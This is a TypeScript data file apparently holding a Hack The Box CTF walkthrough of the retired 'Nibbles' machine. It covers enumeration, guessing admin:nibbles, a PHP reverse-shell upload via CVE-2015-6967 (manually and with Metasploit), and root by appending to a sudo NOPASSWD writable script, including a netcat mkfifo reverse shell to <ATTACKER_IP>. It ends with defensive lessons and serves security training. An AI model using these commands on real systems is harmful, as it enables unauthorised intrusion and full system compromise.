import type { WalkthroughDoc } from "./types";

export const nibbles: WalkthroughDoc = {
  slug: "nibbles",
  name: "Nibbles",
  platform: "Hack The Box",
  os: "Linux",
  difficulty: "Easy",
  retired: "Aug 2018",
  ip: "10.10.10.75",
  tags: [
    "Web enumeration",
    "Nibbleblog 4.0.3",
    "CVE-2015-6967",
    "Arbitrary file upload",
    "PHP webshell",
    "Weak credentials",
    "sudo NOPASSWD",
  ],
  lede: "A blank-looking Apache page hides an abandoned Nibbleblog install one HTML comment away. Guess the admin password, abuse a plugin's unchecked image upload to land a PHP shell, then ride a NOPASSWD sudo rule on a script you own straight to root.",
  summary: "A hidden Nibbleblog 4.0.3 install, guessable admin:nibbles creds, and a My Image plugin file-upload (CVE-2015-6967) give a shell as nibbler; a sudo NOPASSWD rule on a writable monitor.sh hands over root.",
  sections: [
    {
      id: "overview",
      num: "00",
      title: "Overview",
      blocks: [
        { kind: "epigraph", text: "“Nothing interesting here.” — the HTML comment that gives away the whole box" },
        { kind: "p", text: "**Nibbles** is an Easy-rated Linux machine and a near-perfect teaching box for a classic web-to-root chain. There is no exotic tradecraft here — just careful enumeration, one well-known CMS vulnerability, and a sloppy sudo rule. Every stage is small and realistic, which is exactly why it is worth doing by hand rather than reaching straight for a one-shot exploit." },
        { kind: "p", text: "The whole thing hangs off two open ports and a single careless HTML comment. Before we start, here is the complete route from an unauthenticated scan to a root shell:" },
        { kind: "h4", text: "Attack chain" },
        {
          kind: "ol",
          items: [
            "**recon** — nmap: SSH `22`, Apache `80`",
            "**view source** — HTML comment leaks `/nibbleblog/`",
            "**enumerate** — gobuster + `README` → Nibbleblog `4.0.3`",
            "**users.xml** — confirm the `admin` account",
            "**guess creds** — `admin:nibbles` into `admin.php`",
            "**My Image plugin** — file upload (CVE-2015-6967)",
            "**image.php** — PHP shell as `nibbler` → `user.txt`",
            "**sudo -l** — NOPASSWD on `monitor.sh`",
            "**writable script** — append shell, `sudo` it → `root.txt`",
          ],
        },
        { kind: "callout", variant: "note", title: "Why this box matters", text: "Nibbles is a textbook demonstration that *the vulnerability is rarely the interesting part*. The version disclosure, the guessable password, the world-readable data files and the writable root-run script are all configuration mistakes — the kind that show up in real engagements far more often than a novel 0-day." },
      ],
    },
    {
      id: "recon",
      num: "01",
      title: "Enumeration",
      blocks: [
        { kind: "h3", text: "Port scan" },
        { kind: "p", text: "A default scripts-and-versions scan against the target returns just two open ports: OpenSSH and Apache. SSH is current and patched, so it is almost certainly not the way in — the web server gets our attention." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ nmap -sC -sV -oA nibbles 10.10.10.75",
            "PORT   STATE SERVICE VERSION",
            "22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)",
            "80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))",
            "|_http-server-header: Apache/2.4.18 (Ubuntu)",
            "|_http-title: Site doesn't have a title (text/html).",
          ],
          highlight: [3],
        },
        { kind: "p", text: "The version banners place this on **Ubuntu 16.04 (Xenial)**. OpenSSH 7.2p2 is not exploitable in any useful way here, so we park port 22 and turn to the Apache instance on 80." },
        { kind: "h3", text: "A page that looks empty" },
        { kind: "p", text: "Browsing to `http://10.10.10.75/` renders a page that appears blank — nmap already told us the site has no `<title>`. A page that looks empty in the browser but returns `200 OK` almost always has something in the raw markup. We view the source." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ curl -s http://10.10.10.75/ | grep -i nibble",
            "<!-- /nibbleblog/ directory. Nothing interesting here -->",
          ],
          highlight: [1],
        },
        { kind: "callout", variant: "warn", title: "Always View Source", text: "The landing page's only content is that HTML comment. A whole foothold hidden in a `<!-- ... -->` is a recurring lesson: never trust the rendered page — read the bytes. The reassuring “Nothing interesting here” is, of course, exactly where everything interesting lives." },
      ],
    },
    {
      id: "web-enum",
      num: "02",
      title: "Enumerating Nibbleblog",
      blocks: [
        { kind: "p", text: "Browsing to `/nibbleblog/` reveals a **Nibbleblog** instance — a lesser-known PHP flat-file CMS (do not confuse it with WordPress; it stores its data in XML on disk rather than in a database). To understand the attack surface we brute-force the directory structure and, crucially, hunt for a version number." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ gobuster dir -u http://10.10.10.75/nibbleblog \\",
            "      -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php",
            "/index.php            (Status: 200) [Size: 2987]",
            "/admin.php            (Status: 200) [Size: 1401]",
            "/content              (Status: 301) [--> http://10.10.10.75/nibbleblog/content/]",
            "/plugins              (Status: 301) [--> http://10.10.10.75/nibbleblog/plugins/]",
            "/install.php          (Status: 200) [Size: 78]",
          ],
        },
        { kind: "p", text: "`admin.php` is the login panel, `content/` holds the flat-file data, and `plugins/` is where the CMS's extensions live — remember that directory, it becomes the upload sink later. Before touching the login form we pin the exact version, because Nibbleblog ships a `README` that discloses it verbatim." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ curl -s http://10.10.10.75/nibbleblog/README | grep -i version",
            "Version: 4.0.3",
          ],
          highlight: [1],
        },
        { kind: "callout", variant: "key", title: "Recovered", text: "CMS **Nibbleblog 4.0.3**, admin panel at `/nibbleblog/admin.php`, and a live `content/` data directory. The precise version is the whole game — it pins us to a single, well-documented CVE." },
        { kind: "callout", variant: "note", title: "install.php is a red herring", text: "`install.php` is still reachable (it returns a tiny 78-byte response), which is tempting but a dead end on a machine that is already configured. Leaving the installer in place is a real-world bad practice, but the real path forward is `admin.php`." },
      ],
    },
    {
      id: "users-xml",
      num: "03",
      title: "Confirming the admin account",
      blocks: [
        { kind: "p", text: "Because Nibbleblog keeps everything in flat XML under `content/`, its private files are worth probing directly. The `users.xml` file lists the site's accounts — reading it tells us the username without a single guess, and shows how the CMS defends its login form." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ curl -s http://10.10.10.75/nibbleblog/content/private/users.xml | xmllint --format -",
            "<users>",
            "  <user username=\"admin\">",
            "    ...",
            "  </user>",
            "  <blacklist type=\"bruteForce\">",
            "    ...",
            "  </blacklist>",
            "</users>",
          ],
          highlight: [2],
        },
        { kind: "p", text: "There is exactly one account — **admin** — and the file also carries a `bruteForce` blacklist of locked-out source IPs. That second detail is a warning: Nibbleblog blacklists an IP after **5** failed logins. The password itself is *not* stored in cleartext, so we cannot simply read it off disk." },
        { kind: "callout", variant: "warn", title: "Do not brute-force the login", text: "The 5-attempt lockout means a hydra run against `admin.php` will blacklist your own IP and lock you out of the panel. Guess passwords **manually**, a few obvious candidates at a time. If you do get blacklisted, a machine reset clears the list." },
      ],
    },
    {
      id: "login",
      num: "04",
      title: "Guessing the password",
      blocks: [
        { kind: "p", text: "Username known, brute force off the table — so we reason about the password instead of spraying it. On a box this theme-heavy the machine's own name is always the first thing to try, and here it lands on the first attempt. We browse to `admin.php` and log in." },
        {
          kind: "code",
          lang: "text",
          label: "admin.php login",
          lines: [
            "# http://10.10.10.75/nibbleblog/admin.php",
            "username = admin",
            "password = nibbles",
          ],
          highlight: [1, 2],
        },
        { kind: "callout", variant: "key", title: "Recovered", text: "Credentials **admin : nibbles** — the machine/theme name reused as the password. This grants full CMS administrative access, including the plugin configuration pages we need next." },
        { kind: "callout", variant: "tip", title: "Keep the candidate list short", text: "Try only the obvious few — `nibbles`, `admin`, `nibbleblog`, `password` — one or two at a time. The whole point of manual guessing here is to stay under the 5-attempt lockout, so resist the urge to feed it a wordlist." },
      ],
    },
    {
      id: "foothold",
      num: "05",
      title: "Foothold — My Image plugin file upload (CVE-2015-6967)",
      blocks: [
        { kind: "epigraph", text: "“An image upload that never checks it's an image.”" },
        { kind: "p", text: "Nibbleblog 4.0.3's **My Image** plugin has an authenticated arbitrary file-upload flaw, **CVE-2015-6967**. The plugin's image handler never validates the file type or extension, so a `.php` file uploaded as the “image” is written verbatim into the web root and executed by Apache. That turns a cosmetic feature into remote code execution the moment we can reach it as an admin — which we now can." },
        { kind: "p", text: "The manual path is to visit the plugin's configuration page and upload a PHP reverse shell in place of an image. We use the classic pentestmonkey `php-reverse-shell.php`, editing the `$ip` and `$port` variables to point back at our listener first, then start a netcat catcher and trigger the dropped file." },
        {
          kind: "code",
          lang: "bash",
          label: "manual upload + trigger",
          lines: [
            "# Plugins > My image > configure, then upload php-reverse-shell.php:",
            "# admin.php?controller=plugins&action=config&plugin=my_image",
            "",
            "# start the listener locally",
            "$ nc -lvnp 4444",
            "",
            "# the upload lands at a predictable path — request it to execute the shell",
            "$ curl http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php",
          ],
        },
        { kind: "p", text: "If you would rather let Metasploit handle the authentication, upload and triggering in one step, the framework ships a module for this exact bug. It needs the credentials we recovered — without `USERNAME` and `PASSWORD` it fails quietly." },
        {
          kind: "code",
          lang: "bash",
          label: "metasploit alternative",
          lines: [
            "$ msfconsole -q",
            "msf6 > use exploit/multi/http/nibbleblog_file_upload",
            "msf6 > set RHOSTS 10.10.10.75",
            "msf6 > set TARGETURI /nibbleblog",
            "msf6 > set USERNAME admin",
            "msf6 > set PASSWORD nibbles",
            "msf6 > set LHOST tun0",
            "msf6 > run",
          ],
        },
        { kind: "p", text: "Either way we catch a shell as the web user. It is a raw, non-interactive shell, so we upgrade it to a proper TTY before poking around." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
            "nibbler@Nibbles:/$ id",
            "uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)",
          ],
          highlight: [2],
        },
        { kind: "callout", variant: "warn", title: "Upload gotchas", text: "Three things trip people up here. The plugin's `my_image` upload directory only exists once the plugin has been visited/activated, so open the plugins list first. The reverse shell **will not connect** unless you edit its `$ip`/`$port` before uploading. And if `image.php` doesn't appear, re-save the plugin config and re-upload — Nibbleblog sometimes overwrites the file on repeat saves." },
      ],
    },
    {
      id: "user-flag",
      num: "06",
      title: "user.txt",
      blocks: [
        { kind: "p", text: "The shell runs as **nibbler**, and its home directory holds both the user flag and a file that turns out to be central to privilege escalation." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "nibbler@Nibbles:/$ cd /home/nibbler",
            "nibbler@Nibbles:~$ ls -la",
            "personal.zip  user.txt",
            "nibbler@Nibbles:~$ cat user.txt",
            "76a8fc64····························",
          ],
          highlight: [4],
        },
        { kind: "callout", variant: "note", title: "Note the personal.zip", text: "That `personal.zip` sitting next to the flag is not clutter — it is the seed for the entire privesc path. Keep it in mind as we move to enumerating our privileges." },
      ],
    },
    {
      id: "privesc-enum",
      num: "07",
      title: "Privilege escalation — sudo -l",
      blocks: [
        { kind: "p", text: "The first thing to check on any Linux foothold is what we are allowed to run as another user. `sudo -l` answers that immediately, and here it is decisive." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "nibbler@Nibbles:~$ sudo -l",
            "User nibbler may run the following commands on Nibbles:",
            "    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh",
          ],
          highlight: [2],
        },
        { kind: "p", text: "We can run **monitor.sh as root, with no password**. The critical observation is *where* that script lives: `/home/nibbler/personal/stuff/` sits entirely inside nibbler's own home directory. We own that tree, which means we control the contents of the script the system will run as root. That is the whole vulnerability." },
        { kind: "p", text: "The `personal/` tree comes out of the `personal.zip` we spotted earlier, so we unpack it to materialise the path." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "nibbler@Nibbles:~$ unzip personal.zip",
            "nibbler@Nibbles:~$ ls -la /home/nibbler/personal/stuff/",
            "monitor.sh",
          ],
        },
        { kind: "callout", variant: "tip", title: "The zip is optional", text: "If `personal.zip` is missing or you would rather skip it, just recreate the path yourself: `mkdir -p /home/nibbler/personal/stuff` and write your own `monitor.sh`. sudo only cares that a file exists at that exact path — it does not care how it got there." },
      ],
    },
    {
      id: "root",
      num: "08",
      title: "Root — hijacking monitor.sh",
      blocks: [
        { kind: "p", text: "Because we can both **write** the script and **run it as root**, escalation is trivial: append a payload of our choosing, then invoke the script through sudo so our command executes with root's privileges. The simplest payload just launches an interactive shell." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "nibbler@Nibbles:~$ echo '/bin/bash' | tee -a /home/nibbler/personal/stuff/monitor.sh",
            "nibbler@Nibbles:~$ sudo /home/nibbler/personal/stuff/monitor.sh",
            "root@Nibbles:~# id",
            "uid=0(root) gid=0(root) groups=0(root)",
          ],
          highlight: [3],
        },
        { kind: "p", text: "If your shell is not a real TTY, `echo '/bin/bash'` may not give you an interactive prompt — in that case append a netcat reverse-shell one-liner instead and catch it on a second listener." },
        {
          kind: "code",
          lang: "bash",
          label: "non-TTY alternative",
          lines: [
            "nibbler@Nibbles:~$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 5555 >/tmp/f' \\",
            "      | tee -a /home/nibbler/personal/stuff/monitor.sh",
            "nibbler@Nibbles:~$ sudo /home/nibbler/personal/stuff/monitor.sh",
          ],
        },
        { kind: "callout", variant: "warn", title: "Call it by its full path", text: "sudo matches the rule against the *exact* command string. Invoke the script by the full absolute path exactly as it appears in `sudo -l` — a relative path or a different form and sudo will refuse it. Use `tee -a` / `>>` to append cleanly, though since you own the file, overwriting works too." },
      ],
    },
    {
      id: "root-flag",
      num: "09",
      title: "root.txt",
      blocks: [
        { kind: "p", text: "As root, the final flag is a formality." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "root@Nibbles:~# cat /root/root.txt",
            "c7a86…····························",
          ],
          highlight: [1],
        },
        { kind: "p", text: "Two open ports, one HTML comment, a guessed password, a plugin that trusts its uploads, and a root-run script anyone could rewrite — nibbler to root without a single memory-corruption bug in sight." },
      ],
    },
    {
      id: "defense",
      num: "10",
      title: "Defensive takeaways",
      blocks: [
        {
          kind: "ul",
          items: [
            "**Retire end-of-life CMS software.** Nibbleblog 4.0.3 carries an authenticated file-upload flaw (CVE-2015-6967). Keep web apps patched and remove abandoned or unused installs entirely — an idle CMS is still an attack surface.",
            "**Ban guessable and reused passwords.** `admin:nibbles` was the machine name reused as a credential. Enforce strong, unique passwords and add MFA on admin panels.",
            "**Don't leak internal paths in HTML.** The `/nibbleblog/` comment handed over the whole foothold. Strip developer comments and directory hints from production markup.",
            "**Keep data and installer files off the web.** `users.xml`, `config.xml`, `README` and `install.php` were all directly fetchable. Restrict access to data files and delete installers after setup.",
            "**Validate uploads properly.** Check extension, MIME and content, and store uploads outside the web root or in a directory where script execution is disabled — a file upload should never become code execution.",
            "**Never grant NOPASSWD sudo on a user-writable script.** A root-run script that a low-priv user can edit is equivalent to giving that user root. Keep such scripts root-owned, non-writable, and stored outside user home directories.",
          ],
        },
        { kind: "callout", variant: "note", title: "Skills exercised", text: "HTTP recon · source-comment discovery · directory brute-forcing · CMS version fingerprinting · flat-file data enumeration · credential guessing under lockout · authenticated file-upload RCE (CVE-2015-6967) · TTY upgrade · sudo enumeration · writable-script privilege escalation." },
      ],
    },
  ],
};
